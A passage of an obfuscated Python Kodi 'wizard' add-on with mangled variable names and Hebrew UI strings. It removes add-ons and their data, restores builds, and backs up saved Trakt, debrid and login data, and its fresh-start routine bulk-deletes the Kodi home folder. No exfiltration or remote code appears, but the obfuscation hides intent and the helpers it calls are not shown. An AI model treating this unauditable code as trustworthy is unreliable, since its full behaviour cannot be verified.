		OOOOOOOO0O000OOOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00OOOOOOO00OO00 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OO0OO000000O0OOOO ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4597
	if OOOOOOOO0O000OOOO ==1 :#line:4598
		O00OO00OOOO00000O =os .path .join (ADDONS ,OO0OO000000O0OOOO )#line:4599
		wiz .log ("Removing Addon %s"%OO0OO000000O0OOOO )#line:4600
		wiz .cleanHouse (O00OO00OOOO00000O )#line:4601
		xbmc .sleep (1000 )#line:4602
		try :shutil .rmtree (O00OO00OOOO00000O )#line:4603
		except Exception as O0O0O0O0OOOOO00OO :wiz .log ("Error removing %s"%OO0OO000000O0OOOO ,xbmc .LOGNOTICE )#line:4604
		removeAddonData (OO0OO000000O0OOOO ,OO00OOOOOOO00OO00 ,over )#line:4605
	if over ==False :#line:4606
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OO00OOOOOOO00OO00 ))#line:4607
def removeAddonData (O0O0O0O0O0OO0O00O ,name =None ,over =False ):#line:4609
	if O0O0O0O0O0OO0O00O =='all':#line:4610
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4611
			wiz .cleanHouse (ADDOND )#line:4612
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4613
	elif O0O0O0O0O0OO0O00O =='uninstalled':#line:4614
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4615
			OO00O00OO000OOO00 =0 #line:4616
			for OO0OOO000OOOOOO00 in glob .glob (os .path .join (ADDOND ,'*')):#line:4617
				O00O0O00O0O0O0OO0 =OO0OOO000OOOOOO00 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4618
				if O00O0O00O0O0O0OO0 in EXCLUDES :pass #line:4619
				elif os .path .exists (os .path .join (ADDONS ,O00O0O00O0O0O0OO0 )):pass #line:4620
				else :wiz .cleanHouse (OO0OOO000OOOOOO00 );OO00O00OO000OOO00 +=1 ;wiz .log (OO0OOO000OOOOOO00 );shutil .rmtree (OO0OOO000OOOOOO00 )#line:4621
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO00O00OO000OOO00 ))#line:4622
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4623
	elif O0O0O0O0O0OO0O00O =='empty':#line:4624
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4625
			OO00O00OO000OOO00 =wiz .emptyfolder (ADDOND )#line:4626
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO00O00OO000OOO00 ))#line:4627
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4628
	else :#line:4629
		OO0OOO0OO0OO0OO0O =os .path .join (USERDATA ,'addon_data',O0O0O0O0O0OO0O00O )#line:4630
		if O0O0O0O0O0OO0O00O in EXCLUDES :#line:4631
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4632
		elif os .path .exists (OO0OOO0OO0OO0OO0O ):#line:4633
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O0O0O0O0OO0O00O ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4634
				wiz .cleanHouse (OO0OOO0OO0OO0OO0O )#line:4635
				try :#line:4636
					shutil .rmtree (OO0OOO0OO0OO0OO0O )#line:4637
				except :#line:4638
					wiz .log ("Error deleting: %s"%OO0OOO0OO0OO0OO0O )#line:4639
			else :#line:4640
				wiz .log ('Addon data for %s was not removed'%O0O0O0O0O0OO0O00O )#line:4641
	wiz .refresh ()#line:4642
def restoreit (OO0000O0O0O000OO0 ):#line:4644
	if OO0000O0O0O000OO0 =='build':#line:4645
		OO0O000O00OO0000O =freshStart ('restore')#line:4646
		if OO0O000O00OO0000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4647
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4648
		wiz .skinToDefault ()#line:4649
	wiz .restoreLocal (OO0000O0O0O000OO0 )#line:4650
def restoreextit (OO00O000000O00OOO ):#line:4652
	if OO00O000000O00OOO =='build':#line:4653
		O000O00OOOO000000 =freshStart ('restore')#line:4654
		if O000O00OOOO000000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4655
	wiz .restoreExternal (OO00O000000O00OOO )#line:4656
def buildInfo (O0000OOO0O0O00O00 ):#line:4658
	if wiz .workingURL (SPEEDFILE )==True :#line:4659
		if wiz .checkBuild (O0000OOO0O0O00O00 ,'url'):#line:4660
			O0000OOO0O0O00O00 ,O0OO00OO0OO0O00OO ,O0OO0000000OOOOO0 ,O00O0O0OO00O0OOO0 ,OOOOO0O0O00OO00OO ,OOOO0000000O0000O ,O0O00000O0O0OOO00 ,O00O000OOO0O00O0O ,OO00O0O0OO0OO0O00 ,OOOOO00OO000OO000 ,OO0O00O00O0000O00 =wiz .checkBuild (O0000OOO0O0O00O00 ,'all')#line:4661
			OOOOO00OO000OO000 ='Yes'if OOOOO00OO000OO000 .lower ()=='yes'else 'No'#line:4662
			OOO0O00O0O000O0O0 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0000OOO0O0O00O00 )#line:4663
			OOO0O00O0O000O0O0 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OO00OO0OO0O00OO )#line:4664
			if not OOOO0000000O0000O =="http://":#line:4665
				OOOOOO0OO00O0O0OO =wiz .themeCount (O0000OOO0O0O00O00 ,False )#line:4666
				OOO0O00O0O000O0O0 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OOOOOO0OO00O0O0OO ))#line:4667
			OOO0O00O0O000O0O0 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOOO0O0O00OO00OO )#line:4668
			OOO0O00O0O000O0O0 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOOO00OO000OO000 )#line:4669
			OOO0O00O0O000O0O0 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0O00O00O0000O00 )#line:4670
			wiz .TextBox (ADDONTITLE ,OOO0O00O0O000O0O0 )#line:4671
		else :wiz .log ("Invalid Build Name!")#line:4672
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4673
def buildVideo (O00000O000O00O0O0 ):#line:4675
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4676
	if wiz .workingURL (SPEEDFILE )==True :#line:4677
		OO00000O000OOO0O0 =wiz .checkBuild (O00000O000O00O0O0 ,'preview')#line:4678
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O00000O000O00O0O0 )#line:4679
		if OO00000O000OOO0O0 and not OO00000O000OOO0O0 =='http://':playVideo (OO00000O000OOO0O0 )#line:4680
		else :wiz .log ("[%s]Unable to find url for video preview"%O00000O000O00O0O0 )#line:4681
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4682
def dependsList (O0OO0O0O0O0OO0O00 ):#line:4684
	O0O0OOOOO00O00O00 =os .path .join (ADDONS ,O0OO0O0O0O0OO0O00 ,'addon.xml')#line:4685
	if os .path .exists (O0O0OOOOO00O00O00 ):#line:4686
		OO0O000OO0O0O0O0O =open (O0O0OOOOO00O00O00 ,mode ='r');OO00O0O000O0OO0O0 =OO0O000OO0O0O0O0O .read ();OO0O000OO0O0O0O0O .close ();#line:4687
		O0O00O00OOOO0O0O0 =wiz .parseDOM (OO00O0O000O0OO0O0 ,'import',ret ='addon')#line:4688
		O0O00OO0OO0OOOOOO =[]#line:4689
		for OOOOOOO0000OOOO0O in O0O00O00OOOO0O0O0 :#line:4690
			if not 'xbmc.python'in OOOOOOO0000OOOO0O :#line:4691
				O0O00OO0OO0OOOOOO .append (OOOOOOO0000OOOO0O )#line:4692
		return O0O00OO0OO0OOOOOO #line:4693
	return []#line:4694
def manageSaveData (O0OO00OO0OOOOOO0O ):#line:4696
	if O0OO00OO0OOOOOO0O =='import':#line:4697
		OO00O0OOO0OO00O0O =os .path .join (ADDONDATA ,'temp')#line:4698
		if not os .path .exists (OO00O0OOO0OO00O0O ):os .makedirs (OO00O0OOO0OO00O0O )#line:4699
		OOOO000O0O00OO0OO =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4700
		if not OOOO000O0O00OO0OO .endswith ('.zip'):#line:4701
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4702
			return #line:4703
		OO00O0O00OOO0O0OO =os .path .join (MYBUILDS ,'SaveData.zip')#line:4704
		O0O0O0000OOO0000O =xbmcvfs .copy (OOOO000O0O00OO0OO ,OO00O0O00OOO0O0OO )#line:4705
		wiz .log ("%s"%str (O0O0O0000OOO0000O ))#line:4706
		extract .all (xbmc .translatePath (OO00O0O00OOO0O0OO ),OO00O0OOO0OO00O0O )#line:4707
		OOOO000O0O000O0O0 =os .path .join (OO00O0OOO0OO00O0O ,'trakt')#line:4708
		OO000OOOO00O0OOOO =os .path .join (OO00O0OOO0OO00O0O ,'login')#line:4709
		OOOOO00OO000OO0O0 =os .path .join (OO00O0OOO0OO00O0O ,'debrid')#line:4710
		OOOOOO0O0000O0000 =0 #line:4711
		if os .path .exists (OOOO000O0O000O0O0 ):#line:4712
			OOOOOO0O0000O0000 +=1 #line:4713
			O0OO000O0OO00000O =os .listdir (OOOO000O0O000O0O0 )#line:4714
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4715
			for OO00OOOO00O0OO00O in O0OO000O0OO00000O :#line:4716
				O000OO0OOOOO0OOOO =os .path .join (traktit .TRAKTFOLD ,OO00OOOO00O0OO00O )#line:4717
				OO00O0OOO0O000O0O =os .path .join (OOOO000O0O000O0O0 ,OO00OOOO00O0OO00O )#line:4718
				if os .path .exists (O000OO0OOOOO0OOOO ):#line:4719
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO00OOOO00O0OO00O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4720
					else :os .remove (O000OO0OOOOO0OOOO )#line:4721
				shutil .copy (OO00O0OOO0O000O0O ,O000OO0OOOOO0OOOO )#line:4722
			traktit .importlist ('all')#line:4723
			traktit .traktIt ('restore','all')#line:4724
		if os .path .exists (OO000OOOO00O0OOOO ):#line:4725
			OOOOOO0O0000O0000 +=1 #line:4726
			O0OO000O0OO00000O =os .listdir (OO000OOOO00O0OOOO )#line:4727
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4728
			for OO00OOOO00O0OO00O in O0OO000O0OO00000O :#line:4729
				O000OO0OOOOO0OOOO =os .path .join (loginit .LOGINFOLD ,OO00OOOO00O0OO00O )#line:4730
				OO00O0OOO0O000O0O =os .path .join (OO000OOOO00O0OOOO ,OO00OOOO00O0OO00O )#line:4731
				if os .path .exists (O000OO0OOOOO0OOOO ):#line:4732
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO00OOOO00O0OO00O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4733
					else :os .remove (O000OO0OOOOO0OOOO )#line:4734
				shutil .copy (OO00O0OOO0O000O0O ,O000OO0OOOOO0OOOO )#line:4735
			loginit .importlist ('all')#line:4736
			loginit .loginIt ('restore','all')#line:4737
		if os .path .exists (OOOOO00OO000OO0O0 ):#line:4738
			OOOOOO0O0000O0000 +=1 #line:4739
			O0OO000O0OO00000O =os .listdir (OOOOO00OO000OO0O0 )#line:4740
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4741
			for OO00OOOO00O0OO00O in O0OO000O0OO00000O :#line:4742
				O000OO0OOOOO0OOOO =os .path .join (debridit .REALFOLD ,OO00OOOO00O0OO00O )#line:4743
				OO00O0OOO0O000O0O =os .path .join (OOOOO00OO000OO0O0 ,OO00OOOO00O0OO00O )#line:4744
				if os .path .exists (O000OO0OOOOO0OOOO ):#line:4745
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO00OOOO00O0OO00O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4746
					else :os .remove (O000OO0OOOOO0OOOO )#line:4747
				shutil .copy (OO00O0OOO0O000O0O ,O000OO0OOOOO0OOOO )#line:4748
			debridit .importlist ('all')#line:4749
			debridit .debridIt ('restore','all')#line:4750
		wiz .cleanHouse (OO00O0OOO0OO00O0O )#line:4751
		wiz .removeFolder (OO00O0OOO0OO00O0O )#line:4752
		os .remove (OO00O0O00OOO0O0OO )#line:4753
		if OOOOOO0O0000O0000 ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4754
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4755
	elif O0OO00OO0OOOOOO0O =='export':#line:4756
		OOO0OOOOO0OO0O0O0 =xbmc .translatePath (MYBUILDS )#line:4757
		OO0O0OOOO00O0000O =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4758
		traktit .traktIt ('update','all')#line:4759
		loginit .loginIt ('update','all')#line:4760
		debridit .debridIt ('update','all')#line:4761
		OOOO000O0O00OO0OO =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4762
		OOOO000O0O00OO0OO =xbmc .translatePath (OOOO000O0O00OO0OO )#line:4763
		OOO0OO000OOOOOO00 =os .path .join (OOO0OOOOO0OO0O0O0 ,'SaveData.zip')#line:4764
		O0000O0O0O0O0000O =zipfile .ZipFile (OOO0OO000OOOOOO00 ,mode ='w')#line:4765
		for O0O0O0OOO0O000O0O in OO0O0OOOO00O0000O :#line:4766
			if os .path .exists (O0O0O0OOO0O000O0O ):#line:4767
				O0OO000O0OO00000O =os .listdir (O0O0O0OOO0O000O0O )#line:4768
				for O0O00OO0000OO0OO0 in O0OO000O0OO00000O :#line:4769
					O0000O0O0O0O0000O .write (os .path .join (O0O0O0OOO0O000O0O ,O0O00OO0000OO0OO0 ),os .path .join (O0O0O0OOO0O000O0O ,O0O00OO0000OO0OO0 ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4770
		O0000O0O0O0O0000O .close ()#line:4771
		if OOOO000O0O00OO0OO ==OOO0OOOOO0OO0O0O0 :#line:4772
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OO000OOOOOO00 ))#line:4773
		else :#line:4774
			try :#line:4775
				xbmcvfs .copy (OOO0OO000OOOOOO00 ,os .path .join (OOOO000O0O00OO0OO ,'SaveData.zip'))#line:4776
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (OOOO000O0O00OO0OO ,'SaveData.zip')))#line:4777
			except :#line:4778
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OO000OOOOOO00 ))#line:4779
def freshStart (install =None ,over =False ):#line:4784
	if USERNAME =='':#line:4785
		ADDON .openSettings ()#line:4786
		sys .exit ()#line:4787
	OO0O0000OO00OO0OO =u_list (SPEEDFILE )#line:4788
	(OO0O0000OO00OO0OO )#line:4789
	O00OOO000OO0O00OO =(wiz .workingURL (OO0O0000OO00OO0OO ))#line:4790
	(O00OOO000OO0O00OO )#line:4791
	if KEEPTRAKT =='true':#line:4792
		traktit .autoUpdate ('all')#line:4793
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4794
	if KEEPREAL =='true':#line:4795
		debridit .autoUpdate ('all')#line:4796
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4797
	if KEEPLOGIN =='true':#line:4798
		loginit .autoUpdate ('all')#line:4799
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4800
	if over ==True :O0000O0OO00O0OOO0 =1 #line:4801
	elif install =='restore':O0000O0OO00O0OOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4802
	elif install :O0000O0OO00O0OOO0 =1 #line:4803
	else :O0000O0OO00O0OOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4804
	if O0000O0OO00O0OOO0 :#line:4805
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4806
			OO000O00000000O00 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4807
			skinSwitch .swapSkins (OO000O00000000O00 )#line:4810
			OOO00000O00O00000 =0 #line:4811
			xbmc .sleep (1000 )#line:4812
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOO00000O00O00000 <150 :#line:4813
				OOO00000O00O00000 +=1 #line:4814
				xbmc .sleep (1000 )#line:4815
				wiz .ebi ('SendAction(Select)')#line:4816
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4817
				wiz .ebi ('SendClick(11)')#line:4818
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4819
			xbmc .sleep (1000 )#line:4820
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4821
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4822
			return #line:4823
		wiz .addonUpdates ('set')#line:4824
		O000OO0O0OOOO000O =os .path .abspath (HOME )#line:4825
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4826
		O0O0O00OO000000OO =sum ([len (O0000O000OOO0OO00 )for O00OO00OOO000OOOO ,OO0OOO0OO0OO0000O ,O0000O000OOO0OO00 in os .walk (O000OO0O0OOOO000O )]);O00OO000000OO00O0 =0 #line:4827
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4828
		EXCLUDES .append ('My_Builds')#line:4829
		EXCLUDES .append ('archive_cache')#line:4830
		EXCLUDES .append ('script.module.requests')#line:4831
		EXCLUDES .append ('myfav.anon')#line:4832
		if KEEPREPOS =='true':#line:4833
			O000000OOO00O0OOO =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4834
			for O000OO00O000000OO in O000000OOO00O0OOO :#line:4835
				O0OO0O000O0OO0OOO =os .path .split (O000OO00O000000OO [:-1 ])[1 ]#line:4836
				if not O0OO0O000O0OO0OOO ==EXCLUDES :#line:4837
					EXCLUDES .append (O0OO0O000O0OO0OOO )#line:4838
		if KEEPSUPER =='true':#line:4839
			EXCLUDES .append ('plugin.program.super.favourites')#line:4840
		if KEEPMOVIELIST =='true':#line:4841
			EXCLUDES .append ('plugin.video.metalliq')#line:4842
		if KEEPMOVIELIST =='true':#line:4843
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4844
		if KEEPADDONS =='true':#line:4845
			EXCLUDES .append ('addons')#line:4846
		if KEEPADDONS =='true':#line:4847
			EXCLUDES .append ('addon_data')#line:4848
		EXCLUDES .append ('plugin.video.elementum')#line:4851
		EXCLUDES .append ('script.elementum.burst')#line:4852
		EXCLUDES .append ('script.elementum.burst-master')#line:4853
		EXCLUDES .append ('plugin.video.quasar')#line:4854
		EXCLUDES .append ('script.quasar.burst')#line:4855
		EXCLUDES .append ('skin.estuary')#line:4856
		if KEEPWHITELIST =='true':#line:4859
			O0O0OO000O0000O00 =''#line:4860
			OOO00O0OOOO000O00 =wiz .whiteList ('read')#line:4861
			if len (OOO00O0OOOO000O00 )>0 :#line:4862
				for O000OO00O000000OO in OOO00O0OOOO000O00 :#line:4863
					try :O00000OOO00O00O0O ,O00O00O000O0OO0OO ,OOO00O00000O000OO =O000OO00O000000OO #line:4864
					except :pass #line:4865
					if OOO00O00000O000OO .startswith ('pvr'):O0O0OO000O0000O00 =O00O00O000O0OO0OO #line:4866
					O00000OO00O0OOO00 =dependsList (OOO00O00000O000OO )#line:4867
					for O00OO000000O0OO0O in O00000OO00O0OOO00 :#line:4868
						if not O00OO000000O0OO0O in EXCLUDES :#line:4869
							EXCLUDES .append (O00OO000000O0OO0O )#line:4870
						OO00O0OO00OO0OOO0 =dependsList (O00OO000000O0OO0O )#line:4871
						for OOOOO00OO0OO00O00 in OO00O0OO00OO0OOO0 :#line:4872
							if not OOOOO00OO0OO00O00 in EXCLUDES :#line:4873
								EXCLUDES .append (OOOOO00OO0OO00O00 )#line:4874
					if not OOO00O00000O000OO in EXCLUDES :#line:4875
						EXCLUDES .append (OOO00O00000O000OO )#line:4876
				if not O0O0OO000O0000O00 =='':wiz .setS ('pvrclient',OOO00O00000O000OO )#line:4877
		if wiz .getS ('pvrclient')=='':#line:4878
			for O000OO00O000000OO in EXCLUDES :#line:4879
				if O000OO00O000000OO .startswith ('pvr'):#line:4880
					wiz .setS ('pvrclient',O000OO00O000000OO )#line:4881
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4882
		O0O00000O0O0000O0 =wiz .latestDB ('Addons')#line:4883
		for O00OO0OOOOOO0OO0O ,OOO0OO0OO0000000O ,OO0OO0OOO0OO0OOOO in os .walk (O000OO0O0OOOO000O ,topdown =True ):#line:4884
			OOO0OO0OO0000000O [:]=[OO00OOOO0O0OOO0OO for OO00OOOO0O0OOO0OO in OOO0OO0OO0000000O if OO00OOOO0O0OOO0OO not in EXCLUDES ]#line:4885
			for O00000OOO00O00O0O in OO0OO0OOO0OO0OOOO :#line:4886
				O00OO000000OO00O0 +=1 #line:4887
				OOO00O00000O000OO =O00OO0OOOOOO0OO0O .replace ('/','\\').split ('\\')#line:4888
				OOO00000O00O00000 =len (OOO00O00000O000OO )-1 #line:4890
				if OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4891
				elif O00000OOO00O00O0O =='MyVideos99.db'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4892
				elif O00000OOO00O00O0O =='MyVideos107.db'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4893
				elif O00000OOO00O00O0O =='MyVideos116.db'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4894
				elif O00000OOO00O00O0O =='MyVideos99.db'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4895
				elif O00000OOO00O00O0O =='MyVideos107.db'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4896
				elif O00000OOO00O00O0O =='MyVideos116.db'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4897
				elif OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4898
				elif OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'skin.anonymous.mod'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4899
